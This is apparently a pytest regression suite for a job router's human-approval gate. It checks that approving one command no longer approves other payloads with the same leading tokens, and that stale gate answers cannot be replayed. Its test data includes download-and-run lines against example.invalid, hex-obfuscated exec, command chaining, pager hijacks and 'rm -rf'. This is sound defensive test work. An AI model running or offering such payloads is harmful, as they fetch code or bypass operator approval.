"""SEC-07: an approval covers what the operator saw, not every payload that starts the same way.

The class key used to be the first two whitespace tokens of a shell command or of python code,
so approving `python -c "print(1)"` approved `shell::python -c` -- every program python could
run -- and approving a python job whose code began `import os` approved every later program
beginning `import os`. After that, only the regex static check stood between a payload and
execution; no person was asked again.

And the gate token was derived from that class key while gate files are durable, so a payload
job_gate() had deliberately held back as risky still ran: it was parked under the same token
as an earlier, already-answered gate for its class.

Everything here runs the real router (job_gate, run_job, dispatch_once, _recheck_awaiting)
against temp queue / store / gate directories. Nothing is executed: every LOCAL executor is
replaced by a stub that records what it was asked to run.
"""
import json
import os
from pathlib import Path

import pytest

import relay.task_router as tr


@pytest.fixture
def router(tmp_path, monkeypatch):
    tasks = tmp_path / "tasks"
    monkeypatch.setattr(tr, "TASKS", str(tasks))
    monkeypatch.setattr(tr, "APPROVED_JOBS_FILE", str(tmp_path / "approved_jobs.json"))
    monkeypatch.setattr(tr, "ALLOWED_BASE", Path(tmp_path))
    monkeypatch.setattr(tr, "TASK_JOB_APPROVAL_MODE", "default")
    monkeypatch.setattr(tr, "notify_approval_gate", lambda *a, **k: None)
    # dispatch_once's fleet-side passes are not what this file is about; keep them inert.
    for name in ("recover_failed_autostart", "_reconcile_landings", "_reconcile_outcomes",
                 "_deliver_waiting_goals"):
        monkeypatch.setattr(tr, name, lambda *a, **k: [])
    ran = []

    def _stub(kind):
        def run(payload):
            ran.append((kind, payload.get("cmd") or payload.get("command") or
                        payload.get("code") or payload.get("path")))
            return "ok", {"stub": True}, None
        return run

    for kind in ("shell", "python", "file", "screenshot"):
        monkeypatch.setitem(tr.LOCAL_EXECUTORS, kind, _stub(kind))
    tr.ensure_dirs()

    class R:
        pass

    r = R()
    r.tasks = tasks
    r.ran = ran
    r.gate_dir = tmp_path / ".companion_gates"
    return r


def _submit(r, jid, job_type, payload):
    with open(r.tasks / "pending" / ("%s.json" % jid), "w", encoding="utf-8") as f:
        json.dump({"id": jid, "type": job_type, "payload": payload}, f)


def _gate(r, token):
    return json.loads((r.gate_dir / ("%s.json" % token)).read_text(encoding="utf-8"))


def _answer(r, token, answer="approved"):
    p = r.gate_dir / ("%s.json" % token)
    g = json.loads(p.read_text(encoding="utf-8"))
    g["answered"], g["answer"] = True, answer
    p.write_text(json.dumps(g, ensure_ascii=False), encoding="utf-8")


def _by_id(recs, jid):
    return [x for x in recs if x.get("id") == jid]


def _approve_via_gate(r, jid, job_type, payload):
    """The operator path: submit, see the gate, approve it, let the router run the job."""
    _submit(r, jid, job_type, payload)
    first = _by_id(tr.dispatch_once(), jid)
    assert first and first[0]["status"] == "awaiting_approval", first
    token = first[0]["result"]["gate_token"]
    _answer(r, token)
    done = _by_id(tr.dispatch_once(), jid)
    assert done and done[0]["status"] == "ok", done
    return token


# Pairs that share their first two whitespace tokens and differ only in the code that follows.
# Every B is one the static check finds clean -- otherwise the old gate would have caught it
# and the test would prove nothing about the class key.
SAME_TWO_TOKENS = [
    ("shell", {"cmd": 'python -c "print(1)"'},
     {"cmd": 'python -c "exec(bytes.fromhex(\'7072696e74283229\').decode())"'}),
    ("shell", {"cmd": "powershell -Command Get-Date"},
     {"cmd": "powershell -Command Get-ChildItem C:\\ -Recurse | Out-File x.txt"}),
    # (-EncodedCommand is not here because the static check already stops it; the class-key
    # question only matters for what that check lets through.)
    ("shell", {"cmd": "powershell -NoProfile Get-Date"},
     {"cmd": "powershell -NoProfile Start-Process calc"}),
    ("shell", {"cmd": "cmd /c echo hi"}, {"cmd": "cmd /c curl -o x.exe http://example.invalid"}),
    ("shell", {"cmd": "bash -c 'ls'"}, {"cmd": "bash -c 'wget -q example.invalid/x -O /tmp/x'"}),
    ("shell", {"cmd": "git -c color.ui=false status"},
     {"cmd": "git -c core.pager=calc.exe log"}),
    ("shell", {"cmd": "git status"}, {"cmd": "git status & calc.exe"}),
    ("python", {"code": "import os\nprint(os.getcwd())"},
     {"code": "import os\nos.startfile('calc.exe')"}),
]


@pytest.mark.parametrize("job_type,a,b", SAME_TWO_TOKENS)
def test_approving_a_does_not_approve_b_with_the_same_two_leading_tokens(router, job_type, a, b):
    text_b = b.get("cmd") or b.get("code")
    assert tr._static_risk(job_type, b)[0] == "clean", "B must be clean or this proves nothing"
    _approve_via_gate(router, "a1", job_type, a)
    router.ran.clear()

    decision, reason = tr.job_gate(job_type, b, "default")
    assert decision == "CONFIRM", (decision, reason)

    _submit(router, "b1", job_type, b)
    recs = _by_id(tr.dispatch_once(), "b1")
    assert recs and recs[0]["status"] == "awaiting_approval", recs
    assert router.ran == [], "B ran on A's approval"
    # and it is a fresh question, about B, showing B in full
    gate = _gate(router, recs[0]["result"]["gate_token"])
    assert gate["answered"] is False
    assert tr._normalised_payload_text(text_b) in gate["question"]


@pytest.mark.parametrize("job_type,a,_b", SAME_TWO_TOKENS)
def test_the_identical_payload_is_still_approved(router, job_type, a, _b):
    _approve_via_gate(router, "a1", job_type, a)
    router.ran.clear()
    again = dict(a)
    # same text modulo line endings / outer whitespace
    for k in ("cmd", "code"):
        if k in again:
            again[k] = "  " + again[k].replace("\n", "\r\n") + "\n"
    _submit(router, "a2", job_type, again)
    recs = _by_id(tr.dispatch_once(), "a2")
    assert recs and recs[0]["status"] == "ok", recs
    assert len(router.ran) == 1


def test_a_non_code_class_still_covers_its_class(router):
    """The class form is unchanged for commands whose arguments cannot carry code."""
    assert tr._job_class_key("shell", {"cmd": "git status --short"}) == "shell::git status"
    _approve_via_gate(router, "g1", "shell", {"cmd": "git status --short"})
    router.ran.clear()
    _submit(router, "g2", "shell", {"cmd": "git status --porcelain --branch"})
    recs = _by_id(tr.dispatch_once(), "g2")
    assert recs and recs[0]["status"] == "ok", recs
    assert router.ran == [("shell", "git status --porcelain --branch")]
    # and the class gate said what it covers
    token = tr._gate_token_for_class("shell::git status")
    assert "shell::git status" in _gate(router, token)["question"]


def test_an_answered_class_gate_does_not_run_a_flagged_payload_of_that_class(router):
    """The replay: job_gate holds a risky same-class payload back, and the durable class gate
    that was answered long ago used to approve it on the next recheck."""
    _approve_via_gate(router, "c1", "shell", {"cmd": "git log --oneline"})
    router.ran.clear()
    risky = {"cmd": "git log --grep=deploy"}           # ASK pattern, same class "git log"
    assert tr._job_class_key("shell", risky) == "shell::git log"
    assert tr._static_risk("shell", risky)[0] == "ask"
    _submit(router, "c2", "shell", risky)
    tr.dispatch_once()
    tr.dispatch_once()
    assert router.ran == [], "a flagged payload ran on its class's old answer"
    assert (router.tasks / "awaiting" / "c2.json").is_file()


def test_approving_a_flagged_payload_does_not_approve_its_class(router):
    """The operator was asked about exactly `git log --grep=deploy`; saying yes to it must not
    quietly approve the class `git log` for everything after."""
    _approve_via_gate(router, "f1", "shell", {"cmd": "git log --grep=deploy"})
    assert not tr._is_class_approved("shell::git log")
    assert tr.job_gate("shell", {"cmd": "git log --oneline"}, "default")[0] == "CONFIRM"


def test_auto_mode_ask_confirms_are_per_payload(router, monkeypatch):
    monkeypatch.setattr(tr, "TASK_JOB_APPROVAL_MODE", "auto")
    first = {"cmd": "git log --grep=deploy"}
    _approve_via_gate(router, "p1", "shell", first)
    router.ran.clear()
    _submit(router, "p2", "shell", {"cmd": "git log --grep=release --all"})
    tr.dispatch_once()
    tr.dispatch_once()
    assert router.ran == []
    assert (router.tasks / "awaiting" / "p2.json").is_file()


def test_two_queued_payloads_are_answered_separately(router):
    a = {"cmd": 'python -c "print(1)"'}
    b = {"cmd": 'python -c "print(2)"'}
    _submit(router, "q1", "shell", a)
    _submit(router, "q2", "shell", b)
    recs = tr.dispatch_once()
    ta = _by_id(recs, "q1")[0]["result"]["gate_token"]
    tb = _by_id(recs, "q2")[0]["result"]["gate_token"]
    assert ta != tb
    _answer(router, ta)
    tr.dispatch_once()
    assert router.ran == [("shell", 'python -c "print(1)"')]
    assert (router.tasks / "awaiting" / "q2.json").is_file()


def test_the_question_shows_the_whole_payload(router):
    tail = "TAIL_MARKER_" + "x" * 20
    code = "print('ok')\n" + "#" * 400 + "\n" + tail
    _submit(router, "l1", "python", {"code": code})
    rec = _by_id(tr.dispatch_once(), "l1")[0]
    q = _gate(router, rec["result"]["gate_token"])["question"]
    assert tail in q and code in q


def test_a_job_dropped_straight_into_awaiting_is_asked_about_not_run(router):
    """awaiting/ is as writable as pending/. A job placed there under an already-approved
    class key must not borrow that approval; it gets its own question."""
    _approve_via_gate(router, "s1", "shell", {"cmd": 'python -c "print(1)"'})
    router.ran.clear()
    with open(router.tasks / "awaiting" / "s2.json", "w", encoding="utf-8") as f:
        json.dump({"id": "s2", "type": "shell",
                   "payload": {"cmd": 'python -c "print(3)"'}}, f)
    tr.dispatch_once()
    assert router.ran == []
    key = tr._job_class_key("shell", {"cmd": 'python -c "print(3)"'})
    gate = _gate(router, tr._gate_token_for_class(key))
    assert gate["answered"] is False and 'print(3)' in gate["question"]


def test_a_refused_payload_in_awaiting_is_refused_not_run(router, monkeypatch):
    """Under `auto` a STOP payload is refused outright. Parked in awaiting/ by hand it is
    refused there too, whatever gate might match it."""
    monkeypatch.setattr(tr, "TASK_JOB_APPROVAL_MODE", "auto")
    payload = {"cmd": "rm -rf build"}
    key = tr._gate_key("shell", payload, "stop")
    router.gate_dir.mkdir(parents=True, exist_ok=True)
    (router.gate_dir / ("%s.json" % tr._gate_token_for_class(key))).write_text(
        json.dumps({"token": "x", "question": "", "answered": True, "answer": "approved"}),
        encoding="utf-8")
    with open(router.tasks / "awaiting" / "d1.json", "w", encoding="utf-8") as f:
        json.dump({"id": "d1", "type": "shell", "payload": payload}, f)
    recs = _by_id(tr.dispatch_once(), "d1")
    assert recs and recs[0]["status"] == "denied", recs
    assert router.ran == []


@pytest.mark.parametrize("cmd", [
    "git status", "git status --short", "echo gated-run", "dir src", "C:\\tools\\rg.exe foo",
])
def test_plain_commands_keep_a_class(cmd):
    assert tr._shell_class_prefix(cmd) is not None, cmd


@pytest.mark.parametrize("cmd", [
    "python -c x", "C:\\Python312\\python.exe -c x", "python3.12 script.py", "py -3 -c x",
    "pwsh -c x", "powershell Get-Date", "powershell -EncodedCommand AAAA", "cmd /c dir", "wsl ls", "node -e x",
    "git -c a=b status", "git --exec-path=C:/x status", "git rebase -x calc", "git fetch --upload-pack=calc",
    "git submodule foreach calc", "find . -exec calc ;", "docker run img",
    "git status && calc", "git status | more", "echo %COMSPEC%", 'git commit -m "x"',
    '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -c x', "git status\ncalc",
])
def test_code_carrying_commands_have_no_class(cmd):
    assert tr._shell_class_prefix(cmd) is None, cmd
    assert "@sha256:" in tr._job_class_key("shell", {"cmd": cmd})


def test_no_class_key_can_spell_an_exact_key():
    exact = tr._exact_key("shell", {"cmd": 'python -c "print(1)"'})
    forged = exact.split("@", 1)[1]                    # "sha256:<hex>" as a bare token
    assert tr._job_class_key("shell", {"cmd": forged}) != exact
